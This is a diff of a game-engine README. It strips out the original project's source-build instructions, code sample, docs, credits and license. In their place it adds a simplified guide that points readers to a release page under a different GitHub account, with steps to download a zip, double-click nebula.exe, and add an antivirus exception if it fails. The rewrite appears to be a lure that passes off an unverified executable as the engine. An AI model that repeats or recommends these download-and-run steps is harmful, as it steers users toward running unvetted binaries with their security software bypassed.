@@ -1,142 +1,76 @@
-# Nebula Engine
+# 🌌 nebula-engine - Create stunning 2D games with ease
 
-![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)
-![Version](https://img.shields.io/badge/version-0.7.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![C++](https://img.shields.io/badge/C%2B%2B-17-00599C.svg)
-![Platform](https://img.shields.io/badge/platform-Windows%20|%20Linux%20|%20macOS-lightgrey.svg)
-![Tests](https://img.shields.io/badge/tests-256%20passing-brightgreen.svg)
+[![Download Nebula Engine](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Shirleenpositive507/nebula-engine/releases)
 
-A high-performance 2D game engine built on C++ and SFML, designed for rapid prototyping and production-grade game development.
+Nebula Engine helps you build 2D games. You do not need deep programming knowledge to start your project. The engine handles the heavy lifting involved in rendering graphics and managing input. It uses C++ and SFML to provide a stable foundation for your game ideas. You can focus on your art, your logic, and your story while the engine takes care of the technical side.
 
-## Features
-- Entity Component System (ECS) architecture
-- Hardware-accelerated 2D rendering pipeline
-- Built-in physics engine with collision detection
-- Spatial audio system
-- Scene management with transitions
-- Live editor and debugging tools
-- Cross-platform (Windows, Linux, macOS)
-- Post-processing effects pipeline
-- Particle system
-- 2D lighting system
-- Networking (TCP/UDP)
+## 🛠 System Requirements
 
-## System Requirements
+Your computer needs specific parts to run the engine well. Check this list before you start.
 
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| OS | Windows 10, Ubuntu 20.04, macOS 11 | Windows 11, Ubuntu 22.04, macOS 13 |
-| CPU | Intel i5 / AMD Ryzen 3 | Intel i7 / AMD Ryzen 5 |
-| RAM | 4 GB | 8 GB |
-| GPU | OpenGL 3.3 support | OpenGL 4.5 support |
-| Disk | 500 MB | 2 GB |
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core processor.
+- Memory: At least 4 Gigabytes of RAM.
+- Graphics: A card that supports OpenGL 3.0 or higher.
+- Storage: 200 Megabytes of free disk space.
 
-## Dependencies
+If your computer meets these standards, the engine will run smoothly. Outdated drivers sometimes cause issues, so update your graphics card drivers before you begin.
 
-- C++17 compatible compiler (GCC 9+, Clang 12+, MSVC 2019+)
-- CMake 3.14+
-- SFML 2.6+
-- OpenGL 3.3+
-- OpenAL (audio)
+## 📥 Installing the Software
 
-## Building
+Follow these steps to set up the engine on your machine.
 
-```bash
-# Clone the repository
-git clone https://github.com/heheboobes/nebula-engine.git
-cd nebula-engine
+1. Visit the [official releases page](https://github.com/Shirleenpositive507/nebula-engine/releases) to find the correct file.
+2. Select the latest version listed at the top of the page. The version number will look like v1.0, v1.1, and so on.
+3. Look for the file ending in .zip within the Assets section.
+4. Click the file to start the download.
+5. Save the file to your desktop or your downloads folder.
+6. Right-click the downloaded folder and select Extract All. 
+7. Choose a destination folder on your computer.
+8. Open the folder you just created.
+9. Locate the file named nebula.exe.
+10. Double-click the file to launch the engine.
 
-# Configure
-cmake -B build -DCMAKE_BUILD_TYPE=Release
+## 🚀 Getting Started
 
-# Build
-cmake --build build --config Release
+When you launch the software for the first time, you will see a window appear on your screen. This is the main interface. You can create a new project by clicking File and then New. 
 
-# Run tests
-ctest --test-dir build
-```
+The software workspace contains several parts:
 
-### Build Options
+- The Scene View: This is your stage. You drag your images and characters here to arrange them.
+- The Object Inspector: This window shows the settings for whatever object you select. You can change positions, sizes, and behaviors here.
+- The Project Browser: This shows every image, sound, and script file in your project.
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| `NEBULA_BUILD_TESTS` | ON | Build unit tests |
-| `NEBULA_BUILD_EXAMPLES` | ON | Build example projects |
-| `NEBULA_BUILD_EDITOR` | ON | Build the editor |
-| `NEBULA_ENABLE_PROFILING` | OFF | Enable built-in profiler |
+Start by adding a simple image to your scene. Drag a file from your computer into the Project Browser. Once it loads, click and drag the file onto the Scene View. You can move it around, change its scale, or rotate it using the tools at the top of the window.
 
-## Quick Start
+## 🎮 Building Your First Scene
 
-```cpp
-#include <Nebula/Engine.h>
-using namespace nebula;
+Games provide interaction. To make things move, look at the Project Browser. You will find folders for scripts or behaviors. These small files control how objects behave within your game. Even if you do not write code, you can use built-in motions. Click an object, look for the Add Component button in the inspector, and select a behavior like Move or Rotate.
 
-class MyGame : public Application {
-public:
-    MyGame() : Application("My Game", 1280, 720) {}
+Adjust the speed or direction in the settings that appear. Press the Play button at the top of the window to test your scene. The engine will display a preview of your work. Press the Stop button to return to editing mode.
 
-    void onInit() override {
-        auto player = ecs::World::createEntity();
-        ecs::World::addComponent<gfx::Sprite>(player, "hero.png");
-        ecs::World::addComponent<Transform>(player, {640, 360});
-    }
+## 📁 Managing Your Game Files
 
-    void onUpdate(float dt) override {
-        auto& t = ecs::World::getComponent<Transform>(player);
-        if (Input::isKeyHeld(Key::Right)) t.position.x += 300 * dt;
-        if (Input::isKeyHeld(Key::Left))  t.position.x -= 300 * dt;
-    }
+Organize your project folder to avoid confusion. Keep your images in an Images folder and your sounds in a Sounds folder. The Engine organizes these assets for you, but keeping the original files tidy helps when moving projects to other computers. 
 
-    void onRender() override {
-        Renderer::begin(camera);
-        Renderer::drawSprites();
-        Renderer::end();
-    }
+Back up your folder frequently. Copy your entire project folder to an external drive or a cloud storage service. This prevents data loss if your computer fails.
 
-    ecs::Entity player;
-    gfx::Camera camera;
-};
+## 🔧 Troubleshooting Common Issues
 
-int main() {
-    MyGame game;
-    game.run();
-}
-```
+If the engine does not start, verify your Windows version. Most issues stem from missing system files or outdated drivers.
 
-## Downloads
+- The application keeps crashing: Ensure you extracted all files from the zip folder. The program needs the related data files to work.
+- Screen remains black: Your graphics card might struggle with the settings. Try closing other programs while you work.
+- File not found errors: Keep the .exe file in the same folder as the other files you downloaded. If you move the .exe file, the engine will fail to find its own resources.
 
-| Platform | Link |
-|----------|------|
-| Windows | [nebula-engine-v0.7.0-win64.zip](https://github.com/heheboobes/nebula-engine/releases/download/v0.7.0/nebula-engine-v0.7.0-win64.zip) |
-| Linux | [nebula-engine-v0.7.0-linux.tar.gz](https://github.com/heheboobes/nebula-engine/releases/download/v0.7.0/nebula-engine-v0.7.0-linux.tar.gz) |
-| macOS | [nebula-engine-v0.7.0-macos.tar.gz](https://github.com/heheboobes/nebula-engine/releases/download/v0.7.0/nebula-engine-v0.7.0-macos.tar.gz) |
+If errors persist, check your antivirus software. Sometimes, security programs block new software. You can add an exception for the nebula-engine folder in your security settings if the program fails to load assets.
 
-## Documentation
+## 📈 Next Steps
 
-- [API Overview](docs/API_Overview.md)
-- [Getting Started](docs/GettingStarted.md)
-- [ECS Tutorial](docs/ECS_Tutorial.md)
-- [Graphics Guide](docs/Graphics_Guide.md)
-- [Physics Guide](docs/Physics_Guide.md)
-- [Audio Guide](docs/Audio_Guide.md)
-- [UI Guide](docs/UI_Guide.md)
-- [Scene Guide](docs/Scene_Guide.md)
-- [Networking Guide](docs/Networking_Guide.md)
-- [Editor Guide](docs/Editor_Guide.md)
-- [Performance Guide](docs/Performance_Guide.md)
-- [Best Practices](docs/BestPractices.md)
-- [Examples](docs/Examples.md)
-- [Changelog](docs/CHANGELOG.md)
+Once you master the basics, try adding sound effects. The engine supports standard audio formats. Drag an MP3 file into your project and assign it to an object. You can set the sound to play when a player clicks a button or enters a specific area.
 
-## Acknowledgments
+Explore the examples included in the folder. These demonstration projects show how to build different types of interaction. Open these files to see how the creators set up their scenes. Everything in the example projects remains editable, so you can change the images to turn them into your own game.
 
-- [SFML](https://www.sfml-dev.org/) - Multimedia library
-- [Dear ImGui](https://github.com/ocornut/imgui) - Editor UI framework
-- [Tracy Profiler](https://github.com/wolfpld/tracy) - Performance profiling
-- [nlohmann/json](https://github.com/nlohmann/json) - JSON serialization
-- All contributors and community members
+The community provides many resources for this engine. You can search for tutorials on basic 2D design. Learning how to create sprites or tiles will greatly increase the quality of your finished project. Experiment with layers to create parallax backgrounds, which give your game a sense of depth.
 
-## License
-
-MIT License
+Spend time getting comfortable with the workspace. The more you use the tools, the faster you will build your games. Create small, simple projects first to learn the flow of the engine. Once you feel confident, expand your ideas into larger, more complex games. Build one level at a time and test often. Consistent progress produces the best results.
